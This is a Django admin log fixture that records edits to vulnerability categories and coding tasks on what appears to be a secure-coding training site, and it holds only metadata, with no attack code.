[{"model": "admin.logentry", "pk": 1, "fields": {"action_time": "2024-03-22T18:01:18.210Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 2, "fields": {"action_time": "2024-03-22T18:01:32.957Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 3, "fields": {"action_time": "2024-03-22T18:01:44.069Z", "user": 1, "content_type": 8, "object_id": "3", "object_repr": "Vulnerability: Cross-site request forgery", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 4, "fields": {"action_time": "2024-03-22T18:01:56.901Z", "user": 1, "content_type": 8, "object_id": "4", "object_repr": "Vulnerability: Server-side request forgery (SSRF)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 5, "fields": {"action_time": "2024-03-22T18:02:23.470Z", "user": 1, "content_type": 7, "object_id": "1", "object_repr": "Vulnerability: task1", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 6, "fields": {"action_time": "2024-03-22T18:02:39.328Z", "user": 1, "content_type": 7, "object_id": "2", "object_repr": "Vulnerability: task2", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 7, "fields": {"action_time": "2024-03-22T18:02:53.096Z", "user": 1, "content_type": 7, "object_id": "3", "object_repr": "Vulnerability: task3", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 8, "fields": {"action_time": "2024-03-22T18:04:56.047Z", "user": 1, "content_type": 9, "object_id": "1", "object_repr": "SolvedTask object (1)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 9, "fields": {"action_time": "2024-03-22T18:05:04.488Z", "user": 1, "content_type": 9, "object_id": "2", "object_repr": "SolvedTask object (2)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 10, "fields": {"action_time": "2024-03-23T18:16:48.184Z", "user": 1, "content_type": 7, "object_id": "4", "object_repr": "Vulnerability: task4", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 11, "fields": {"action_time": "2024-03-23T18:16:59.683Z", "user": 1, "content_type": 7, "object_id": "5", "object_repr": "Vulnerability: task5", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 12, "fields": {"action_time": "2024-03-23T18:17:10.302Z", "user": 1, "content_type": 7, "object_id": "6", "object_repr": "Vulnerability: task6", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 13, "fields": {"action_time": "2024-03-23T18:17:22.581Z", "user": 1, "content_type": 7, "object_id": "7", "object_repr": "Vulnerability: task7", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 14, "fields": {"action_time": "2024-03-23T18:17:32.901Z", "user": 1, "content_type": 7, "object_id": "8", "object_repr": "Vulnerability: task8", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 15, "fields": {"action_time": "2024-03-23T18:17:51.787Z", "user": 1, "content_type": 7, "object_id": "9", "object_repr": "Vulnerability: task9", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 16, "fields": {"action_time": "2024-03-23T18:18:02.923Z", "user": 1, "content_type": 7, "object_id": "10", "object_repr": "Vulnerability: task10", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 17, "fields": {"action_time": "2024-03-23T18:18:11.520Z", "user": 1, "content_type": 7, "object_id": "11", "object_repr": "Vulnerability: task11", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 18, "fields": {"action_time": "2024-03-23T18:18:38.081Z", "user": 1, "content_type": 7, "object_id": "12", "object_repr": "Vulnerability: task12", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 19, "fields": {"action_time": "2024-03-23T18:18:49.914Z", "user": 1, "content_type": 7, "object_id": "13", "object_repr": "Vulnerability: task13", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 20, "fields": {"action_time": "2024-03-23T18:18:59.166Z", "user": 1, "content_type": 7, "object_id": "14", "object_repr": "Vulnerability: task14", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 21, "fields": {"action_time": "2024-03-24T08:30:50.110Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 22, "fields": {"action_time": "2024-03-24T08:44:37.205Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 23, "fields": {"action_time": "2024-03-24T08:52:09.698Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 24, "fields": {"action_time": "2024-03-24T11:52:53.887Z", "user": 1, "content_type": 8, "object_id": "5", "object_repr": "Vulnerability: Clickjacking", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 25, "fields": {"action_time": "2024-03-24T11:53:09.481Z", "user": 1, "content_type": 8, "object_id": "6", "object_repr": "Vulnerability: DOM-based vulnerabilities", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 26, "fields": {"action_time": "2024-03-24T13:12:07.977Z", "user": 1, "content_type": 7, "object_id": "15", "object_repr": "Vulnerability: task15", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 27, "fields": {"action_time": "2024-03-24T13:16:40.488Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 28, "fields": {"action_time": "2024-03-24T13:17:25.230Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 29, "fields": {"action_time": "2024-03-24T13:18:54.717Z", "user": 1, "content_type": 8, "object_id": "3", "object_repr": "Vulnerability: Cross-site request forgery", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 30, "fields": {"action_time": "2024-03-24T13:19:18.435Z", "user": 1, "content_type": 8, "object_id": "6", "object_repr": "Vulnerability: DOM-based vulnerabilities", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 31, "fields": {"action_time": "2024-03-24T13:19:21.885Z", "user": 1, "content_type": 8, "object_id": "5", "object_repr": "Vulnerability: Clickjacking", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 32, "fields": {"action_time": "2024-03-24T13:19:28.453Z", "user": 1, "content_type": 8, "object_id": "4", "object_repr": "Vulnerability: Server-side request forgery (SSRF)", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 33, "fields": {"action_time": "2024-03-24T13:19:37.916Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 34, "fields": {"action_time": "2024-03-24T13:31:21.357Z", "user": 1, "content_type": 7, "object_id": "15", "object_repr": "Vulnerability: task15", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 35, "fields": {"action_time": "2024-03-24T13:31:29.554Z", "user": 1, "content_type": 7, "object_id": "14", "object_repr": "Vulnerability: task14", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 36, "fields": {"action_time": "2024-03-24T13:31:33.501Z", "user": 1, "content_type": 7, "object_id": "13", "object_repr": "Vulnerability: task13", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 37, "fields": {"action_time": "2024-03-24T13:31:37.747Z", "user": 1, "content_type": 7, "object_id": "12", "object_repr": "Vulnerability: task12", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 38, "fields": {"action_time": "2024-03-24T13:31:41.079Z", "user": 1, "content_type": 7, "object_id": "12", "object_repr": "Vulnerability: task12", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 39, "fields": {"action_time": "2024-03-24T13:31:44.949Z", "user": 1, "content_type": 7, "object_id": "11", "object_repr": "Vulnerability: task11", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 40, "fields": {"action_time": "2024-03-24T13:31:48.714Z", "user": 1, "content_type": 7, "object_id": "10", "object_repr": "Vulnerability: task10", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 41, "fields": {"action_time": "2024-03-24T13:31:52.179Z", "user": 1, "content_type": 7, "object_id": "9", "object_repr": "Vulnerability: task9", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 42, "fields": {"action_time": "2024-03-24T13:31:55.662Z", "user": 1, "content_type": 7, "object_id": "9", "object_repr": "Vulnerability: task9", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 43, "fields": {"action_time": "2024-03-24T13:31:59.061Z", "user": 1, "content_type": 7, "object_id": "8", "object_repr": "Vulnerability: task8", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 44, "fields": {"action_time": "2024-03-24T13:32:02.355Z", "user": 1, "content_type": 7, "object_id": "7", "object_repr": "Vulnerability: task7", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 45, "fields": {"action_time": "2024-03-24T13:32:06.087Z", "user": 1, "content_type": 7, "object_id": "6", "object_repr": "Vulnerability: task6", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 46, "fields": {"action_time": "2024-03-24T13:32:11.072Z", "user": 1, "content_type": 7, "object_id": "5", "object_repr": "Vulnerability: task5", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 47, "fields": {"action_time": "2024-03-24T13:32:14.648Z", "user": 1, "content_type": 7, "object_id": "4", "object_repr": "Vulnerability: task4", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 48, "fields": {"action_time": "2024-03-24T13:32:18.130Z", "user": 1, "content_type": 7, "object_id": "3", "object_repr": "Vulnerability: task3", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 49, "fields": {"action_time": "2024-03-24T13:32:22.093Z", "user": 1, "content_type": 7, "object_id": "3", "object_repr": "Vulnerability: task3", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 50, "fields": {"action_time": "2024-03-24T13:32:25.832Z", "user": 1, "content_type": 7, "object_id": "2", "object_repr": "Vulnerability: task2", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 51, "fields": {"action_time": "2024-03-24T13:32:29.276Z", "user": 1, "content_type": 7, "object_id": "1", "object_repr": "Vulnerability: task1", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 52, "fields": {"action_time": "2024-03-24T13:32:52.367Z", "user": 1, "content_type": 7, "object_id": "1", "object_repr": "Vulnerability: task1", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 53, "fields": {"action_time": "2024-03-24T13:32:57.410Z", "user": 1, "content_type": 7, "object_id": "2", "object_repr": "Vulnerability: task2", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 54, "fields": {"action_time": "2024-03-24T13:33:04.297Z", "user": 1, "content_type": 7, "object_id": "3", "object_repr": "Vulnerability: task3", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 55, "fields": {"action_time": "2024-03-24T13:33:07.703Z", "user": 1, "content_type": 7, "object_id": "4", "object_repr": "Vulnerability: task4", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 56, "fields": {"action_time": "2024-03-24T13:33:13.854Z", "user": 1, "content_type": 7, "object_id": "5", "object_repr": "Vulnerability: task5", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 57, "fields": {"action_time": "2024-03-24T13:33:22.374Z", "user": 1, "content_type": 7, "object_id": "15", "object_repr": "Vulnerability: task15", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 58, "fields": {"action_time": "2024-03-24T13:33:27.923Z", "user": 1, "content_type": 7, "object_id": "14", "object_repr": "Vulnerability: task14", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 59, "fields": {"action_time": "2024-03-24T13:33:31.467Z", "user": 1, "content_type": 7, "object_id": "13", "object_repr": "Vulnerability: task13", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 60, "fields": {"action_time": "2024-03-24T13:33:35.039Z", "user": 1, "content_type": 7, "object_id": "12", "object_repr": "Vulnerability: task12", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 61, "fields": {"action_time": "2024-03-24T13:33:39.244Z", "user": 1, "content_type": 7, "object_id": "11", "object_repr": "Vulnerability: task11", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 62, "fields": {"action_time": "2024-03-24T13:33:42.870Z", "user": 1, "content_type": 7, "object_id": "10", "object_repr": "Vulnerability: task10", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 63, "fields": {"action_time": "2024-03-24T13:33:46.296Z", "user": 1, "content_type": 7, "object_id": "9", "object_repr": "Vulnerability: task9", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 64, "fields": {"action_time": "2024-03-24T13:33:50.297Z", "user": 1, "content_type": 7, "object_id": "8", "object_repr": "Vulnerability: task8", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 65, "fields": {"action_time": "2024-03-24T13:33:54.286Z", "user": 1, "content_type": 7, "object_id": "7", "object_repr": "Vulnerability: task7", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 66, "fields": {"action_time": "2024-03-24T13:33:57.600Z", "user": 1, "content_type": 7, "object_id": "6", "object_repr": "Vulnerability: task6", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 67, "fields": {"action_time": "2024-04-09T15:37:58.125Z", "user": 1, "content_type": 7, "object_id": "16", "object_repr": "Vulnerability: SQL injection f string", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 68, "fields": {"action_time": "2024-04-15T20:56:52.366Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: SQL injection 1", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 69, "fields": {"action_time": "2024-04-15T21:05:09.321Z", "user": 1, "content_type": 7, "object_id": "16", "object_repr": "Vulnerability: SQL injection f string", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Solution\", \"Hint\", \"Gpt question\"]}}]"}}, {"model": "admin.logentry", "pk": 70, "fields": {"action_time": "2024-04-15T21:18:15.628Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: sql injection 2", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 71, "fields": {"action_time": "2024-04-15T21:18:24.258Z", "user": 1, "content_type": 7, "object_id": "16", "object_repr": "Vulnerability: SQL injection f string", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 72, "fields": {"action_time": "2024-04-15T21:20:59.538Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: sql injection 2", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt question\"]}}]"}}, {"model": "admin.logentry", "pk": 73, "fields": {"action_time": "2024-04-15T21:21:04.946Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: SQL injection 1", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt question\"]}}]"}}, {"model": "admin.logentry", "pk": 74, "fields": {"action_time": "2024-04-15T21:27:51.503Z", "user": 1, "content_type": 7, "object_id": "19", "object_repr": "Vulnerability: sql injection 3", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 75, "fields": {"action_time": "2024-04-15T21:33:48.977Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: SQL injection 1 sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 76, "fields": {"action_time": "2024-04-15T21:33:53.833Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: sql injection 2 sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 77, "fields": {"action_time": "2024-04-15T21:33:58.835Z", "user": 1, "content_type": 7, "object_id": "19", "object_repr": "Vulnerability: sql injection 3sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 78, "fields": {"action_time": "2024-04-15T21:39:27.505Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: SQL injection 4 postgres", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 79, "fields": {"action_time": "2024-04-16T08:35:03.992Z", "user": 1, "content_type": 7, "object_id": "15", "object_repr": "Vulnerability: task15", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 80, "fields": {"action_time": "2024-04-16T08:35:04.010Z", "user": 1, "content_type": 7, "object_id": "14", "object_repr": "Vulnerability: task14", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 81, "fields": {"action_time": "2024-04-16T08:35:04.011Z", "user": 1, "content_type": 7, "object_id": "13", "object_repr": "Vulnerability: task13", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 82, "fields": {"action_time": "2024-04-16T08:35:04.012Z", "user": 1, "content_type": 7, "object_id": "12", "object_repr": "Vulnerability: task12", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 83, "fields": {"action_time": "2024-04-16T08:35:04.013Z", "user": 1, "content_type": 7, "object_id": "11", "object_repr": "Vulnerability: task11", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 84, "fields": {"action_time": "2024-04-16T08:35:04.015Z", "user": 1, "content_type": 7, "object_id": "10", "object_repr": "Vulnerability: task10", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 85, "fields": {"action_time": "2024-04-16T08:35:11.226Z", "user": 1, "content_type": 7, "object_id": "9", "object_repr": "Vulnerability: task9", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 86, "fields": {"action_time": "2024-04-16T08:35:11.232Z", "user": 1, "content_type": 7, "object_id": "8", "object_repr": "Vulnerability: task8", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 87, "fields": {"action_time": "2024-04-16T08:35:11.233Z", "user": 1, "content_type": 7, "object_id": "7", "object_repr": "Vulnerability: task7", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 88, "fields": {"action_time": "2024-04-16T08:35:11.234Z", "user": 1, "content_type": 7, "object_id": "6", "object_repr": "Vulnerability: task6", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 89, "fields": {"action_time": "2024-04-16T08:35:11.235Z", "user": 1, "content_type": 7, "object_id": "5", "object_repr": "Vulnerability: task5", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 90, "fields": {"action_time": "2024-04-16T08:35:11.236Z", "user": 1, "content_type": 7, "object_id": "4", "object_repr": "Vulnerability: task4", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 91, "fields": {"action_time": "2024-04-16T08:35:18.044Z", "user": 1, "content_type": 7, "object_id": "3", "object_repr": "Vulnerability: task3", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 92, "fields": {"action_time": "2024-04-16T08:35:18.051Z", "user": 1, "content_type": 7, "object_id": "2", "object_repr": "Vulnerability: task2", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 93, "fields": {"action_time": "2024-04-16T08:35:18.053Z", "user": 1, "content_type": 7, "object_id": "1", "object_repr": "Vulnerability: task1", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 94, "fields": {"action_time": "2024-04-16T08:43:18.570Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Sqlite add book", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 95, "fields": {"action_time": "2024-04-16T08:45:47.323Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Sqlite add book", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 96, "fields": {"action_time": "2024-04-16T08:47:35.948Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Sqlite add book", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 97, "fields": {"action_time": "2024-04-16T08:56:13.141Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 98, "fields": {"action_time": "2024-04-16T08:56:47.633Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 99, "fields": {"action_time": "2024-04-16T09:00:45.110Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 100, "fields": {"action_time": "2024-04-16T09:01:13.409Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 101, "fields": {"action_time": "2024-04-16T09:01:59.399Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 102, "fields": {"action_time": "2024-04-16T09:02:15.830Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 103, "fields": {"action_time": "2024-04-16T09:04:15.290Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: SQL injection 4 postgres", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 104, "fields": {"action_time": "2024-04-16T09:23:05.690Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: SQL injection 4 postgres", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\"]}}]"}}, {"model": "admin.logentry", "pk": 105, "fields": {"action_time": "2024-04-16T09:39:25.804Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 106, "fields": {"action_time": "2024-04-16T10:23:49.168Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 107, "fields": {"action_time": "2024-04-16T10:27:36.516Z", "user": 1, "content_type": 7, "object_id": "19", "object_repr": "Vulnerability: sql injection 3sqlite", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 108, "fields": {"action_time": "2024-04-16T10:35:42.872Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 109, "fields": {"action_time": "2024-04-16T13:41:55.838Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt question\"]}}]"}}, {"model": "admin.logentry", "pk": 110, "fields": {"action_time": "2024-04-16T13:43:08.467Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt question\"]}}]"}}, {"model": "admin.logentry", "pk": 111, "fields": {"action_time": "2024-04-16T13:46:28.540Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 112, "fields": {"action_time": "2024-04-17T09:29:43.443Z", "user": 1, "content_type": 10, "object_id": "1", "object_repr": "GptQuestion object (1)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 113, "fields": {"action_time": "2024-04-17T09:35:28.839Z", "user": 1, "content_type": 10, "object_id": "2", "object_repr": "GptQuestion object (2)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 114, "fields": {"action_time": "2024-04-17T09:36:04.286Z", "user": 1, "content_type": 10, "object_id": "3", "object_repr": "GptQuestion object (3)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 115, "fields": {"action_time": "2024-04-17T09:38:15.637Z", "user": 1, "content_type": 10, "object_id": "4", "object_repr": "GptQuestion object (4)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 116, "fields": {"action_time": "2024-04-17T09:38:35.386Z", "user": 1, "content_type": 10, "object_id": "5", "object_repr": "GptQuestion object (5)", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 117, "fields": {"action_time": "2024-04-17T09:44:09.060Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 118, "fields": {"action_time": "2024-04-17T09:44:17.943Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Gpt questions\"]}}]"}}, {"model": "admin.logentry", "pk": 119, "fields": {"action_time": "2024-04-17T09:44:23.350Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, 